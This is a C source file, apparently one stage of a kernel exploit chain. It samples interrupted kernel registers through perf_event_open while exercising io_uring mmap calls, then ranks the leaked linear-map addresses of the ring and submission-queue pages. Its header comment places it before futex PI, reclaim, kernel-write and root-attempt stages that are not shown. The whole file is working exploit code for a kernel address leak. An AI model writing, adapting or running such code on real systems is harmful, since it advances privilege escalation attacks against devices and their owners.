#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/io_uring.h>
#include <linux/perf_event.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

/*
 * Device-side, non-arming feasibility probe for the proposed PFN-free TCL
 * capture witness.  It creates ordinary io_uring instances and asks perf to
 * sample the current thread while it exercises two normal file operations:
 *
 *   mmap(SQ_RING)           exposes ctx->rings in a long exact register site;
 *   mmap(SQES)              exposes ctx->sq_sqes at the same exact site.
 *
 * The probe only reports 16 KiB-normalized linear-map pointers observed in
 * interrupted kernel registers.  Per-ring candidates common to poll+submit
 * are ring-page candidates; per-ring submit-only candidates are SQE-page
 * candidates.  It performs no futex PI operation, reclaim choreography,
 * kernel write, root attempt, partition access or persistent change.
 */

#define ORDER2_SIZE 16384U
#define PERF_DATA_PAGES 128U
#define MAX_CANDS 1024
#define TOP_CANDS 32
#define IPS_PER_CAND 8

struct probe_ring {
  int fd;
  struct io_uring_params p;
  uint8_t *rings;
  uint8_t *sqes;
  size_t rings_sz;
  size_t sqes_sz;
};

struct candidate {
  uint64_t base;
  uint64_t example;
  unsigned count;
  struct {
    uint64_t ip;
    unsigned count;
  } ips[IPS_PER_CAND];
  int ip_nr;
};

struct candidate_set {
  struct candidate c[MAX_CANDS];
  int nr;
  unsigned samples;
  unsigned own_samples;
  unsigned lost;
};

static int perf_event_open_local(struct perf_event_attr *pe) {
  return (int)syscall(__NR_perf_event_open, pe, 0, -1, -1, 0);
}

static int setup_ring(struct probe_ring *r) {
  memset(r, 0, sizeof(*r));
  r->fd = -1;
  r->fd = (int)syscall(__NR_io_uring_setup, 256, &r->p);
  if (r->fd < 0)
    return -1;

  r->rings_sz = (size_t)r->p.cq_off.cqes +
                (size_t)r->p.cq_entries * sizeof(struct io_uring_cqe);
  if (r->rings_sz < ORDER2_SIZE)
    r->rings_sz = ORDER2_SIZE;
  r->sqes_sz = (size_t)r->p.sq_entries * sizeof(struct io_uring_sqe);
  if (r->sqes_sz < ORDER2_SIZE)
    r->sqes_sz = ORDER2_SIZE;

  r->rings = mmap(NULL, r->rings_sz, PROT_READ | PROT_WRITE,
                  MAP_SHARED | MAP_POPULATE, r->fd, IORING_OFF_SQ_RING);
  if (r->rings == MAP_FAILED) {
    r->rings = NULL;
    return -1;
  }
  r->sqes = mmap(NULL, r->sqes_sz, PROT_READ | PROT_WRITE,
                 MAP_SHARED | MAP_POPULATE, r->fd, IORING_OFF_SQES);
  if (r->sqes == MAP_FAILED) {
    r->sqes = NULL;
    return -1;
  }
  return 0;
}

static void destroy_ring(struct probe_ring *r) {
  if (r->rings)
    munmap(r->rings, r->rings_sz);
  if (r->sqes)
    munmap(r->sqes, r->sqes_sz);
  if (r->fd >= 0)
    close(r->fd);
  memset(r, 0, sizeof(*r));
  r->fd = -1;
}

static void pump_ring_mmap(struct probe_ring *r, int loops) {
  for (int i = 0; i < loops; i++) {
    void *p = mmap(NULL, r->rings_sz, PROT_READ | PROT_WRITE,
                   MAP_SHARED, r->fd, IORING_OFF_SQ_RING);
    if (p != MAP_FAILED)
      munmap(p, r->rings_sz);
  }
}

static void pump_sqe_mmap(struct probe_ring *r, int loops) {
  int ok = 0, last_errno = 0;
  for (int i = 0; i < loops; i++) {
    void *p = mmap(NULL, r->sqes_sz, PROT_READ | PROT_WRITE,
                   MAP_SHARED, r->fd, IORING_OFF_SQES);
    if (p != MAP_FAILED) {
      ok++;
      munmap(p, r->sqes_sz);
    } else {
      last_errno = errno;
    }
  }
  if (ok != loops)
    fprintf(stderr, "SQE_MMAP ok=%d/%d len=%zu errno=%d\n",
            ok, loops, r->sqes_sz, last_errno);
}

static void add_ip_vote(struct candidate *c, uint64_t ip) {
  for (int i = 0; i < c->ip_nr; i++) {
    if (c->ips[i].ip == ip) {
      c->ips[i].count++;
      return;
    }
  }
  if (c->ip_nr < IPS_PER_CAND) {
    c->ips[c->ip_nr].ip = ip;
    c->ips[c->ip_nr].count = 1;
    c->ip_nr++;
  }
}

static void add_candidate(struct candidate_set *set, uint64_t raw,
                          uint64_t ip) {
  const uint64_t low = UINT64_C(0xffffff8000000000);
  const uint64_t high = UINT64_C(0xffffffc000000000);
  if (raw < low || raw >= high)
    return;
  uint64_t base = raw & ~(uint64_t)(ORDER2_SIZE - 1U);
  for (int i = 0; i < set->nr; i++) {
    if (set->c[i].base == base) {
      set->c[i].count++;
      add_ip_vote(&set->c[i], ip);
      return;
    }
  }
  if (set->nr < MAX_CANDS) {
    set->c[set->nr].base = base;
    set->c[set->nr].example = raw;
    set->c[set->nr].count = 1;
    add_ip_vote(&set->c[set->nr], ip);
    set->nr++;
  }
}

static int candidate_cmp(const void *a, const void *b) {
  const struct candidate *ca = a;
  const struct candidate *cb = b;
  if (ca->count < cb->count) return 1;
  if (ca->count > cb->count) return -1;
  return ca->base < cb->base ? -1 : ca->base > cb->base;
}

static int collect_candidates(struct probe_ring *r, int loops, int submit,
                              struct candidate_set *out) {
  memset(out, 0, sizeof(*out));
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.size = sizeof(pe);
  const char *period_env = getenv("TCL_PERF_PERIOD");
  unsigned long period = period_env ? strtoul(period_env, NULL, 0) : 1000;
  if (period < 100 || period > 100000) period = 1000;
  pe.sample_period = period;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (UINT64_C(1) << 31) - 1;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;

  int pfd = perf_event_open_local(&pe);
  if (pfd < 0)
    return -1;
  size_t map_sz = 4096U * (1U + PERF_DATA_PAGES);
  uint8_t *map = mmap(NULL, map_sz, PROT_READ | PROT_WRITE,
                      MAP_SHARED, pfd, 0);
  if (map == MAP_FAILED) {
    close(pfd);
    return -1;
  }

  ioctl(pfd, PERF_EVENT_IOC_RESET, 0);
  ioctl(pfd, PERF_EVENT_IOC_ENABLE, 0);
  if (submit)
    pump_sqe_mmap(r, loops);
  else
    pump_ring_mmap(r, loops);
  ioctl(pfd, PERF_EVENT_IOC_DISABLE, 0);

  struct perf_event_mmap_page *hdr = (void *)map;
  uint64_t head = __atomic_load_n(&hdr->data_head, __ATOMIC_ACQUIRE);
  uint64_t pos = hdr->data_tail;
  uint8_t *data = map + 4096;
  size_t data_sz = 4096U * PERF_DATA_PAGES;
  uint32_t own_tid = (uint32_t)syscall(__NR_gettid);

  while (pos < head) {
    size_t at = (size_t)(pos % data_sz);
    struct perf_event_header eh;
    if (at + sizeof(eh) <= data_sz) {
      memcpy(&eh, data + at, sizeof(eh));
    } else {
      size_t first = data_sz - at;
      memcpy(&eh, data + at, first);
      memcpy((uint8_t *)&eh + first, data, sizeof(eh) - first);
    }
    if (eh.size < sizeof(eh) || eh.size > 4096)
      break;
    uint8_t record[4096];
    if (at + eh.size <= data_sz) {
      memcpy(record, data + at, eh.size);
    } else {
      size_t first = data_sz - at;
      memcpy(record, data + at, first);
      memcpy(record + first, data, eh.size - first);
    }
    if (eh.type == PERF_RECORD_SAMPLE) {
      uint8_t *p = record + sizeof(eh);
      uint64_t ip;
      uint32_t pid, tid;
      memcpy(&ip, p, 8); p += 8;
      memcpy(&pid, p, 4); memcpy(&tid, p + 4, 4); p += 8;
      (void)ip; (void)pid;
      out->samples++;
      if (tid == own_tid) {
        out->own_samples++;
        uint64_t abi;
        memcpy(&abi, p, 8); p += 8;
        if (abi == PERF_SAMPLE_REGS_ABI_64 || abi == PERF_SAMPLE_REGS_ABI_32) {
          uint64_t *regs = (uint64_t *)p;
          /* Count a physical-block-shaped candidate at most once per sample,
           * even when the compiler keeps aliases in several registers. */
          uint64_t seen[31]; int seen_nr = 0;
          for (int reg = 0; reg < 31; reg++) {
            uint64_t raw = regs[reg];
            uint64_t base = raw & ~(uint64_t)(ORDER2_SIZE - 1U);
            int duplicate = 0;
            for (int j = 0; j < seen_nr; j++)
              if (seen[j] == base) { duplicate = 1; break; }
            if (!duplicate) {
              seen[seen_nr++] = base;
              add_candidate(out, raw, ip);
            }
          }
        }
      }
    } else if (eh.type == PERF_RECORD_LOST) {
      out->lost++;
    }
    pos += eh.size;
  }
  hdr->data_tail = head;
  qsort(out->c, (size_t)out->nr, sizeof(out->c[0]), candidate_cmp);
  munmap(map, map_sz);
  close(pfd);
  return 0;
}

static void print_set(int ring_index, const char *kind,
                      const struct candidate_set *set) {
  printf("PROBE ring=%d kind=%s samples=%u own=%u lost=%u candidates=%d\n",
         ring_index, kind, set->samples, set->own_samples, set->lost, set->nr);
  int top = set->nr < TOP_CANDS ? set->nr : TOP_CANDS;
  for (int i = 0; i < top; i++) {
    uint64_t top_ip = 0;
    unsigned top_ip_votes = 0;
    for (int j = 0; j < set->c[i].ip_nr; j++) {
      if (set->c[i].ips[j].count > top_ip_votes) {
        top_ip = set->c[i].ips[j].ip;
        top_ip_votes = set->c[i].ips[j].count;
      }
    }
    printf("CAND ring=%d kind=%s rank=%d base=%016llx example=%016llx "
           "votes=%u top_ip=%016llx ip_votes=%u\n",
           ring_index, kind, i,
           (unsigned long long)set->c[i].base,
           (unsigned long long)set->c[i].example, set->c[i].count,
           (unsigned long long)top_ip, top_ip_votes);
  }
}

int main(int argc, char **argv) {
  int rings_nr = argc > 1 ? atoi(argv[1]) : 2;
  int loops = argc > 2 ? atoi(argv[2]) : 150000;
  if (rings_nr < 1 || rings_nr > 4 || loops < 1000 || loops > 1000000) {
    fprintf(stderr, "usage: %s [rings 1..4] [loops 1000..1000000]\n", argv[0]);
    return 2;
  }

  struct probe_ring rings[4];
  memset(rings, 0, sizeof(rings));
  for (int i = 0; i < 4; i++) rings[i].fd = -1;
  for (int i = 0; i < rings_nr; i++) {
    if (setup_ring(&rings[i]) != 0) {
      fprintf(stderr, "io_uring setup %d failed: %s\n", i, strerror(errno));
      for (int j = 0; j <= i; j++) destroy_ring(&rings[j]);
      return 1;
    }
  }

  printf("TCL_URING_PERF_PROBE rings=%d loops=%d period=%s order2=%u "
         "SAFE_NO_RECLAIM=1\n", rings_nr, loops,
         getenv("TCL_PERF_PERIOD") ? getenv("TCL_PERF_PERIOD") : "1000",
         ORDER2_SIZE);
  int rc = 0;
  for (int i = 0; i < rings_nr; i++) {
    struct candidate_set poll_set, submit_set;
    if (collect_candidates(&rings[i], loops, 0, &poll_set) != 0) {
      fprintf(stderr, "perf poll probe %d failed: %s\n", i, strerror(errno));
      rc = 1;
      break;
    }
    if (collect_candidates(&rings[i], loops, 1, &submit_set) != 0) {
      fprintf(stderr, "perf submit probe %d failed: %s\n", i, strerror(errno));
      rc = 1;
      break;
    }
    print_set(i, "ring_mmap", &poll_set);
    print_set(i, "sqe_mmap", &submit_set);
  }
  for (int i = 0; i < rings_nr; i++) destroy_ring(&rings[i]);
  return rc;
}
